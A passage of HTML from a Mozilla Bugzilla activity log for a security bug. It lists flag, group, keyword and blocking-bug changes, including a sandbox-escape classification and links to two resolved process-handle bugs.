          <div class="change-time"><span class="rel-time" title="2015-01-09 10:10 PST" data-time="1420827003">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Blocks: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Chromium's base::OpenProcess checks for the wrong return result"
   href="/show_bug.cgi?id=1119874">1119874</a></div></div></div><div class="change-set" id="a607383_279663"><div class="change" id="aa607383_279663">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a607383_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_279663" id="a607383_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a607383_279663"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a607383_279663">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a607383_279663">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-09 10:15 PST" data-time="1420827312">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Blocks: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - IPC child process startup leaks parent process handles into the sandbox"
   href="/show_bug.cgi?id=1119878">1119878</a></div></div></div><div class="change-set" id="a877901_280903"><div class="change" id="aa877901_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a877901_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a877901_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a877901_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a877901_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a877901_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-12 13:23 PST" data-time="1421097830">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: sec-bounty? &rarr; sec-bounty+</div></div></div><div class="change-set" id="a19026585_1689"><div class="change" id="aa19026585_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a19026585_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a19026585_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a19026585_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a19026585_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a19026585_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-08-10 15:41 PDT" data-time="1439246514">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security</span></div></div></div><div class="change-set" id="a170150566_578488"><div class="change" id="aa170150566_578488">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a170150566_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_578488" id="a170150566_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a170150566_578488"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a170150566_578488">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a170150566_578488">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-05-24 18:34 PDT" data-time="1590370495">1 year ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: sec-bounty-hof+</div></div></div><div class="change-set" id="a214619568_578488"><div class="change" id="aa214619568_578488">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a214619568_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_578488" id="a214619568_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a214619568_578488"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a214619568_578488">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a214619568_578488">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-21 11:04 PDT" data-time="1634839497">9 days ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-sandbox-escape&amp;resolution=---">csectype-sandbox-escape</a></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1117140&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>